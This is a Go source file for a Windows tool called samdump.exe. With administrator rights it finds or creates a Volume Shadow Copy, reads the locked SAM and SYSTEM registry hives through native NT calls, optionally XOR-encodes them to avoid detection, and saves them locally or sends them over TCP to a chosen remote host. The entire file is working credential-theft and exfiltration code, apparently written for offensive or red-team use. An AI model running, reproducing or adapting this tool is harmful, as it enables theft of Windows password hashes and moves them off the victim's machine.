package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

const DEBUG_LEVEL = 1

const (
	FILE_READ_DATA              = 0x0001
	FILE_WRITE_DATA             = 0x0002
	FILE_READ_ATTRIBUTES        = 0x0080
	FILE_WRITE_ATTRIBUTES       = 0x0100
	SYNCHRONIZE                 = 0x00100000
	FILE_SHARE_READ             = 0x00000001
	FILE_OPEN                   = 0x00000001
	FILE_OVERWRITE_IF           = 0x00000005
	FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020
	FILE_ATTRIBUTE_NORMAL       = 0x00000080
	OBJ_CASE_INSENSITIVE        = 0x00000040
	COINIT_MULTITHREADED         = 0x0
	VSS_CTX_BACKUP               = 0
	VSS_CTX_ALL                  = 0xFFFFFFFF
	VSS_BT_FULL                  = 1
	VSS_OBJ_NONE                 = 1
	VSS_OBJ_SNAPSHOT             = 3
)

// IVssBackupComponents vtable indices (after 3 IUnknown methods)
const (
	bcInitializeForBackup   = 5
	bcSetBackupState        = 6
	bcGatherWriterMetadata  = 9
	bcPrepareForBackup      = 14
	bcSetContext             = 35
	bcStartSnapshotSet       = 36
	bcAddToSnapshotSet       = 37
	bcDoSnapshotSet          = 38
	bcGetSnapshotProperties  = 42
	bcQuery                  = 43
	bcIsVolumeSupported      = 44
)

type GUID struct {
	Data1 uint32
	Data2 uint16
	Data3 uint16
	Data4 [8]byte
}

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	_pad          [4]byte
	Buffer        uintptr
}

type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	_pad1                    [4]byte
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uint32
	_pad2                    [4]byte
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type IO_STATUS_BLOCK struct {
	Status      uint32
	_pad        uint32
	Information uintptr
}

type VSS_SNAPSHOT_PROP struct {
	SnapshotId           GUID
	SnapshotSetId        GUID
	SnapshotsCount       int32
	_pad1                int32
	SnapshotDeviceObject uintptr
	OriginalVolumeName   uintptr
	OriginatingMachine   uintptr
	ServiceMachine       uintptr
	ExposedName          uintptr
	ExposedPath          uintptr
	ProviderId           GUID
	SnapshotAttributes   int32
	_pad2                int32
	CreationTimestamp     int64
	Status               int32
	_pad3                int32
}

type VSS_OBJECT_PROP struct {
	Type  int32
	_pad  int32
	Snap  VSS_SNAPSHOT_PROP
}

var (
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	ole32    = syscall.NewLazyDLL("ole32.dll")
	shell32  = syscall.NewLazyDLL("shell32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	procNtCreateFile = ntdll.NewProc("NtCreateFile")
	procNtReadFile   = ntdll.NewProc("NtReadFile")
	procNtWriteFile  = ntdll.NewProc("NtWriteFile")
	procNtClose      = ntdll.NewProc("NtClose")

	procCoInitializeEx = ole32.NewProc("CoInitializeEx")
	procCoUninitialize = ole32.NewProc("CoUninitialize")

	procIsUserAnAdmin = shell32.NewProc("IsUserAnAdmin")

	procLoadLibraryW  = kernel32.NewProc("LoadLibraryW")
	procGetProcAddress = kernel32.NewProc("GetProcAddress")
)

func toWide(s string) []uint16 {
	r, _ := syscall.UTF16FromString(s)
	return r
}

func wideToString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var chars []uint16
	for i := 0; ; i++ {
		c := *(*uint16)(unsafe.Pointer(ptr + uintptr(i)*2))
		if c == 0 {
			break
		}
		chars = append(chars, c)
	}
	return syscall.UTF16ToString(chars)
}

func comCall(obj uintptr, methodIndex int, args ...uintptr) (uintptr, error) {
	vtblPtr := *(*uintptr)(unsafe.Pointer(obj))
	methodPtr := *(*uintptr)(unsafe.Pointer(vtblPtr + uintptr(methodIndex)*unsafe.Sizeof(uintptr(0))))
	allArgs := make([]uintptr, 0, 1+len(args))
	allArgs = append(allArgs, obj)
	allArgs = append(allArgs, args...)
	r, _, err := syscall.SyscallN(methodPtr, allArgs...)
	return r, err
}

func comRelease(obj uintptr) {
	if obj != 0 {
		comCall(obj, 2) // Release is index 2
	}
}

func asyncWait(asyncPtr uintptr) {
	if asyncPtr == 0 {
		return
	}
	comCall(asyncPtr, 4, 0xFFFFFFFF) // Wait is index 4 (3 IUnknown + 1 Cancel + Wait)
	comRelease(asyncPtr)
}

func loadVssFunctions() (createFn uintptr, freeFn uintptr, ok bool) {
	dllName := toWide("VssApi.dll")
	hModule, _, _ := procLoadLibraryW.Call(uintptr(unsafe.Pointer(&dllName[0])))
	if hModule == 0 {
		return 0, 0, false
	}

	possibleNames := []string{
		"CreateVssBackupComponentsInternal\x00",
		"CreateVssBackupComponents\x00",
		"?CreateVssBackupComponents@@YAJPEAPEAVIVssBackupComponents@@@Z\x00",
	}

	for _, name := range possibleNames {
		namePtr := unsafe.Pointer(&([]byte(name))[0])
		addr, _, _ := procGetProcAddress.Call(hModule, uintptr(namePtr))
		if addr != 0 {
			createFn = addr
			break
		}
	}
	if createFn == 0 {
		return 0, 0, false
	}

	freeName := []byte("VssFreeSnapshotProperties\x00")
	freeFn, _, _ = procGetProcAddress.Call(hModule, uintptr(unsafe.Pointer(&freeName[0])))
	if freeFn == 0 {
		return 0, 0, false
	}

	return createFn, freeFn, true
}

func createBackupComponents(createFn uintptr) (uintptr, bool) {
	var backup uintptr
	hr, _, _ := syscall.SyscallN(createFn, uintptr(unsafe.Pointer(&backup)))
	if int32(hr) < 0 || backup == 0 {
		return 0, false
	}
	return backup, true
}

func listShadows(createFn, freeFn uintptr) (string, bool) {
	hr, _, _ := procCoInitializeEx.Call(0, COINIT_MULTITHREADED)
	if int32(hr) < 0 && int32(hr) != -2147417850 {
		return "", false
	}
	defer procCoUninitialize.Call()

	backup, ok := createBackupComponents(createFn)
	if !ok {
		return "", false
	}
	defer comRelease(backup)

	r, _ := comCall(backup, bcInitializeForBackup, 0)
	if int32(r) < 0 {
		return "", false
	}

	r, _ = comCall(backup, bcSetContext, uintptr(VSS_CTX_ALL))
	if int32(r) < 0 {
		r, _ = comCall(backup, bcSetContext, uintptr(uint32(VSS_CTX_BACKUP)))
		if int32(r) < 0 {
			return "", false
		}
	}

	var guidNull GUID
	var enumObj uintptr
	r, _ = comCall(backup, bcQuery,
		uintptr(unsafe.Pointer(&guidNull)),
		VSS_OBJ_NONE,
		VSS_OBJ_SNAPSHOT,
		uintptr(unsafe.Pointer(&enumObj)),
	)
	if int32(r) < 0 || enumObj == 0 {
		return "", false
	}
	defer comRelease(enumObj)

	for {
		var prop VSS_OBJECT_PROP
		var fetched uint32
		r, _ = comCall(enumObj, 3, // Next is index 3
			1,
			uintptr(unsafe.Pointer(&prop)),
			uintptr(unsafe.Pointer(&fetched)),
		)
		if int32(r) != 0 || fetched == 0 {
			break
		}

		if prop.Type == VSS_OBJ_SNAPSHOT {
			if prop.Snap.SnapshotDeviceObject != 0 {
				device := wideToString(prop.Snap.SnapshotDeviceObject)
				syscall.SyscallN(freeFn, uintptr(unsafe.Pointer(&prop.Snap)))
				return device, true
			}
			syscall.SyscallN(freeFn, uintptr(unsafe.Pointer(&prop.Snap)))
		}
	}

	return "", false
}

func createShadow(volumePath string, createFn, freeFn uintptr) (string, bool) {
	if DEBUG_LEVEL >= 1 {
		fmt.Printf("[+] Creating Shadow Copy for: %s\n", volumePath)
	}

	hr, _, _ := procCoInitializeEx.Call(0, COINIT_MULTITHREADED)
	if int32(hr) < 0 && int32(hr) != -2147417850 {
		return "", false
	}
	defer procCoUninitialize.Call()

	backup, ok := createBackupComponents(createFn)
	if !ok {
		return "", false
	}
	defer comRelease(backup)

	r, _ := comCall(backup, bcInitializeForBackup, 0)
	if int32(r) < 0 {
		return "", false
	}

	var guidNull GUID
	volWide := toWide(volumePath)

	var isSupported int32
	r, _ = comCall(backup, bcIsVolumeSupported,
		uintptr(unsafe.Pointer(&guidNull)),
		uintptr(unsafe.Pointer(&volWide[0])),
		uintptr(unsafe.Pointer(&isSupported)),
	)
	if int32(r) == 0 && isSupported == 0 {
		fmt.Println("[-] ERROR: Volume does not support VSS")
		return "", false
	}

	r, _ = comCall(backup, bcSetContext, uintptr(uint32(VSS_CTX_BACKUP)))
	if int32(r) < 0 {
		return "", false
	}

	comCall(backup, bcSetBackupState, 0, 0, VSS_BT_FULL, 0)

	var asyncMetadata uintptr
	r, _ = comCall(backup, bcGatherWriterMetadata, uintptr(unsafe.Pointer(&asyncMetadata)))
	if int32(r) >= 0 {
		asyncWait(asyncMetadata)
	}

	var snapshotSetId GUID
	r, _ = comCall(backup, bcStartSnapshotSet, uintptr(unsafe.Pointer(&snapshotSetId)))
	if int32(r) < 0 {
		return "", false
	}

	var snapshotId GUID
	r, _ = comCall(backup, bcAddToSnapshotSet,
		uintptr(unsafe.Pointer(&volWide[0])),
		uintptr(unsafe.Pointer(&guidNull)),
		uintptr(unsafe.Pointer(&snapshotId)),
	)
	if int32(r) < 0 {
		return "", false
	}

	var asyncPrepare uintptr
	r, _ = comCall(backup, bcPrepareForBackup, uintptr(unsafe.Pointer(&asyncPrepare)))
	if int32(r) >= 0 {
		asyncWait(asyncPrepare)
	}

	var asyncSnapshot uintptr
	r, _ = comCall(backup, bcDoSnapshotSet, uintptr(unsafe.Pointer(&asyncSnapshot)))
	if int32(r) < 0 {
		return "", false
	}
	asyncWait(asyncSnapshot)

	var snapProp VSS_SNAPSHOT_PROP
	r, _ = comCall(backup, bcGetSnapshotProperties,
		uintptr(unsafe.Pointer(&snapshotId)),
		uintptr(unsafe.Pointer(&snapProp)),
	)
	if int32(r) >= 0 && snapProp.SnapshotDeviceObject != 0 {
		device := wideToString(snapProp.SnapshotDeviceObject)
		syscall.SyscallN(freeFn, uintptr(unsafe.Pointer(&snapProp)))
		return device, true
	}

	return "", false
}

func openFileNT(filePath string) uintptr {
	wpath := toWide(filePath)

	var us UNICODE_STRING
	us.Length = uint16((len(wpath) - 1) * 2)
	us.MaximumLength = uint16(len(wpath) * 2)
	us.Buffer = uintptr(unsafe.Pointer(&wpath[0]))

	var oa OBJECT_ATTRIBUTES
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = uintptr(unsafe.Pointer(&us))
	oa.Attributes = OBJ_CASE_INSENSITIVE

	var ioStatus IO_STATUS_BLOCK
	var fileHandle uintptr

	r, _, _ := procNtCreateFile.Call(
		uintptr(unsafe.Pointer(&fileHandle)),
		FILE_READ_DATA|FILE_READ_ATTRIBUTES|SYNCHRONIZE,
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&ioStatus)),
		0,
		0,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT,
		0,
		0,
	)

	if int32(r) != 0 {
		return 0
	}
	return fileHandle
}

func readBytesNT(fileHandle uintptr) []byte {
	var content []byte
	var byteOffset int64

	for {
		buf := make([]byte, 4096)
		var ioStatus IO_STATUS_BLOCK

		r, _, _ := procNtReadFile.Call(
			fileHandle,
			0, 0, 0,
			uintptr(unsafe.Pointer(&ioStatus)),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&byteOffset)),
			0,
		)

		status := uint32(r)
		if status == 0xC0000011 {
			break
		}
		if status != 0 && status != 0x103 {
			break
		}

		bytesRead := uint32(ioStatus.Information)
		if bytesRead == 0 {
			break
		}

		content = append(content, buf[:bytesRead]...)
		byteOffset += int64(bytesRead)
	}

	return content
}

func readFile(filePath string, printInfo bool) []byte {
	fh := openFileNT(filePath)
	if fh == 0 {
		if printInfo {
			fmt.Println("[-] Error: Not possible to open the file.")
		}
		return nil
	}

	content := readBytesNT(fh)
	if DEBUG_LEVEL >= 1 && printInfo {
		fmt.Printf("[+] Read %d bytes from %s\n", len(content), filePath)
	}

	procNtClose.Call(fh)
	return content
}

func writeFileNT(filePath string, data []byte) bool {
	wpath := toWide(filePath)

	var us UNICODE_STRING
	us.Length = uint16((len(wpath) - 1) * 2)
	us.MaximumLength = uint16(len(wpath) * 2)
	us.Buffer = uintptr(unsafe.Pointer(&wpath[0]))

	var oa OBJECT_ATTRIBUTES
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = uintptr(unsafe.Pointer(&us))
	oa.Attributes = OBJ_CASE_INSENSITIVE

	var ioStatus IO_STATUS_BLOCK
	var fileHandle uintptr

	r, _, _ := procNtCreateFile.Call(
		uintptr(unsafe.Pointer(&fileHandle)),
		FILE_WRITE_DATA|FILE_WRITE_ATTRIBUTES|SYNCHRONIZE,
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&ioStatus)),
		0,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		0,
		0,
	)

	if int32(r) != 0 {
		fmt.Printf("[-] Error creating file: %s. NTSTATUS: 0x%08X\n", filePath, uint32(r))
		return false
	}

	var byteOffset int64
	r, _, _ = procNtWriteFile.Call(
		fileHandle,
		0, 0, 0,
		uintptr(unsafe.Pointer(&ioStatus)),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&byteOffset)),
		0,
	)

	if int32(r) != 0 {
		fmt.Printf("[-] Error writing to file: %s. NTSTATUS: 0x%08X\n", filePath, uint32(r))
		procNtClose.Call(fileHandle)
		return false
	}

	if DEBUG_LEVEL >= 1 {
		fmt.Printf("[+] Written %d bytes to %s\n", len(data), filePath)
	}

	procNtClose.Call(fileHandle)
	return true
}

func encodeBytes(data []byte, key string) []byte {
	if key == "" {
		result := make([]byte, len(data))
		copy(result, data)
		return result
	}

	keyBytes := []byte(key)
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ keyBytes[i%len(keyBytes)]
	}
	return result
}

func saveFilesLocally(samData, systemData []byte, basePath string) bool {
	samPath := fmt.Sprintf("\\??\\%s\\sam.txt", basePath)
	systemPath := fmt.Sprintf("\\??\\%s\\system.txt", basePath)

	success := true
	if !writeFileNT(samPath, samData) {
		fmt.Println("[-] Error storing SAM")
		success = false
	}
	if !writeFileNT(systemPath, systemData) {
		fmt.Println("[-] Error storing SYSTEM")
		success = false
	}
	return success
}

func sendFileOverSocket(conn net.Conn, filename string, filedata []byte) bool {
	header := make([]byte, 40)
	nameBytes := []byte(filename)
	copyLen := len(nameBytes)
	if copyLen > 32 {
		copyLen = 32
	}
	copy(header[:copyLen], nameBytes[:copyLen])

	binary.BigEndian.PutUint32(header[32:36], uint32(len(filedata)))
	// checksum stays 0

	_, err := conn.Write(header)
	if err != nil {
		fmt.Printf("[-] Error sending header for %s\n", filename)
		return false
	}

	_, err = conn.Write(filedata)
	if err != nil {
		fmt.Printf("[-] Error sending data for %s\n", filename)
		return false
	}

	if DEBUG_LEVEL >= 1 {
		fmt.Printf("[+] %s sent (%d bytes)\n", filename, len(filedata))
	}
	return true
}

func sendFilesRemotely(samData, systemData []byte, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Printf("[-] Error connecting to %s: %s\n", addr, err)
		return false
	}
	defer conn.Close()

	if DEBUG_LEVEL >= 1 {
		fmt.Printf("[+] Connected to %s\n", addr)
	}

	success := true
	if !sendFileOverSocket(conn, "SAM", samData) {
		success = false
	}
	if !sendFileOverSocket(conn, "SYSTEM", systemData) {
		success = false
	}
	return success
}

func printHelp() {
	fmt.Println("Usage: samdump.exe [OPTIONS]")
	fmt.Println("Options:")
	fmt.Println("  --save-local           Save locally (default: false)")
	fmt.Println("  --output-dir DIR       Output directory (default: C:\\Windows\\tasks)")
	fmt.Println("  --send-remote          Send remotely (default: false)")
	fmt.Println("  --host IP              Host for remote sending (default: 127.0.0.1)")
	fmt.Println("  --port PORT            Port for remote sending (default: 7777)")
	fmt.Println("  --xor-encode           XOR Encode (default: false)")
	fmt.Println("  --xor-key KEY          XOR key (default: SAMDump2025)")
	fmt.Println("  --disk DISK            Disk for shadow copy (default: C:\\)")
	fmt.Println("  --help                 Show this help")
	os.Exit(0)
}

func main() {
	saveLocal := flag.Bool("save-local", false, "Save files locally")
	outputDir := flag.String("output-dir", `C:\Windows\tasks`, "Output directory")
	sendRemote := flag.Bool("send-remote", false, "Send files remotely")
	host := flag.String("host", "127.0.0.1", "Host for remote sending")
	port := flag.Int("port", 7777, "Port for remote sending")
	xorEncode := flag.Bool("xor-encode", false, "XOR encode files")
	xorKey := flag.String("xor-key", "SAMDump2025", "XOR key")
	disk := flag.String("disk", `C:\`, "Disk for shadow copy")
	help := flag.Bool("help", false, "Show help")
	flag.Parse()

	if *help || (!*saveLocal && !*sendRemote) {
		printHelp()
	}

	ret, _, _ := procIsUserAnAdmin.Call()
	if ret == 0 {
		fmt.Println("ERROR: Administrator privileges required")
		os.Exit(1)
	}

	createFn, freeFn, ok := loadVssFunctions()
	if !ok {
		fmt.Println("[-] Error: Could not load VSS functions from VssApi.dll")
		os.Exit(1)
	}

	var shadowBasePath string
	newShadowCreated := false

	if device, found := listShadows(createFn, freeFn); found {
		if DEBUG_LEVEL >= 1 {
			fmt.Printf("[+] Shadow Copy found: %s\n", device)
		}
		shadowBasePath = device
	} else {
		if DEBUG_LEVEL >= 1 {
			fmt.Println("[+] No Shadow Copies found: Creating a new one.")
		}
		device, created := createShadow(*disk, createFn, freeFn)
		if !created {
			fmt.Println("\n[-] Failed to create a Shadow copy.")
			os.Exit(1)
		}
		fmt.Printf("[+] Shadow copy created: %s\n", device)
		shadowBasePath = device
		newShadowCreated = true
	}

	shadowBasePath = strings.ReplaceAll(shadowBasePath, `\\?\`, `\??\`)

	samPath := shadowBasePath + `\windows\system32\config\sam`
	systemPath := shadowBasePath + `\windows\system32\config\system`

	samBytes := readFile(samPath, true)
	systemBytes := readFile(systemPath, true)

	if newShadowCreated {
		samBytes = readFile(samPath, false)
		systemBytes = readFile(systemPath, false)
	}

	if *xorEncode {
		samBytes = encodeBytes(samBytes, *xorKey)
		systemBytes = encodeBytes(systemBytes, *xorKey)
		if DEBUG_LEVEL >= 1 {
			fmt.Println("[+] XOR-encoded SAM and SYSTEM content")
		}
	}

	if *saveLocal {
		if saveFilesLocally(samBytes, systemBytes, *outputDir) {
			if DEBUG_LEVEL >= 1 {
				fmt.Println("[+] Success saving files locally")
			}
		} else {
			fmt.Println("[-] Error saving files locally")
		}
	}

	if *sendRemote {
		if sendFilesRemotely(samBytes, systemBytes, *host, *port) {
			if DEBUG_LEVEL >= 1 {
				fmt.Println("[+] Success sending files")
			}
		} else {
			fmt.Println("[-] Error sending files")
		}
	}
}
